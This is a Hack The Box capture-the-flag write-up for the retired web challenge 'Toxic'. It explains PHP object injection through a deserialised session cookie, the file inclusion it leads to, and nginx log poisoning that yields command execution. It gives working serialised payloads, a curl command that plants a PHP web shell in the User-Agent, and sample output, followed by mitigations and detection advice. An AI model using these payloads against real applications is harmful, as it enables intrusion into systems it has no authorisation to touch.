---
challenge: Toxic
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, php, deserialization, object-injection, lfi, log-poisoning]
---

# Toxic — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

- The `PHPSESSID` cookie holds a base64-encoded, serialised PHP object that the app passes to `unserialize`.
- Class `PageModel` has `public $file` and a `__destruct()` that calls `include($this->file)`: injecting the object gives control over a file include (**LFI**).
- To turn the LFI into RCE, poison the nginx log with PHP code in the `User-Agent` and include `/var/log/nginx/access.log`.

## Brief

A site with a landing page and a session cookie that changes per visit. No login, no form: all client state travels in the cookie, which the application deserialises.

## Recon

- Inspect the cookie in DevTools: the value is base64 that decodes to a string starting with `O:` (a serialised PHP object).
- Enumerate common routes and files (`/index.php`, `?page=`) and confirm there are no other entry points.
- Confirm the server is nginx so the log path is known.

## Code analysis

```php
class PageModel {
    public $file;
    public function __destruct() {
        include($this->file);
    }
}

if (isset($_COOKIE['PHPSESSID'])) {
    $obj = unserialize(base64_decode($_COOKIE['PHPSESSID']));
}
```

Two key details:

1. There is no class allowlist (`allowed_classes`): any loaded class can be instantiated from the cookie.
2. `$file` is unvalidated and reaches `include()` when the object is destroyed, at the end of the request.

## Root cause

The bug is **PHP object injection** leading to **local file inclusion**. Deserialising client data lets an attacker build a `PageModel` whose `$file` points at any path readable by the server; the `__destruct` magic method runs the `include` without checking origin or extension.

Because `include` interprets content as PHP when it finds the tags, any system file containing attacker-controlled PHP code is enough: hence **log poisoning**.

## Local reproduction

- Run PHP + nginx with the same class and a log writable by the service user, and point the exploit at `127.0.0.1`.
- Confirm the LFI with `/etc/passwd` before attempting the poison.

## Exploitation

1. Confirm the LFI by including `/etc/passwd`:

```php
O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
```

```bash
PAYLOAD=$(printf 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" http://<IP>:<port>/
```

2. Poison the nginx log with a request whose `User-Agent` is PHP code:

```bash
curl -s -A '<?php system($_GET["c"]); ?>' http://<IP>:<port>/
```

3. Include the log and run commands with `?c=`:

```php
O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
```

```bash
PAYLOAD=$(printf 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" "http://<IP>:<port>/?c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`?c=cat /flag*` prints the flag.

## Evidence

- Trimmed output of the key commands; no flags, credentials or tokens.
- Real values live in `private/` and are not published.

## Lessons

- **Property length**: `s:4:"file"` and `s:11:"/etc/passwd"` count exact characters (including `/`); one byte off breaks deserialisation and the cookie is silently ignored.
- **Base64 line breaks**: use `-w0` so the cookie is not cut.
- **Log path**: it depends on the server (`/var/log/nginx/access.log`, `/var/log/apache2/access.log`); if unreadable, try `/proc/self/environ` or session files.
- **`unserialize` on client data** is code execution through magic methods, not just data reading.
- Mitigation: `json_decode` for client state, `allowed_classes => false`, and an allowlist of included files.

## Mitigations and detection

- Never deserialise client data; if unavoidable, use `allowed_classes => false` and sign/HMAC the state.
- Replace `include($file)` with an allowlisted template list and reject absolute paths or `..`.
- Detection: cookie values that decode to PHP objects, `include` of log paths, and `User-Agent` values containing `<?php` tags.

## References

- [OWASP: PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
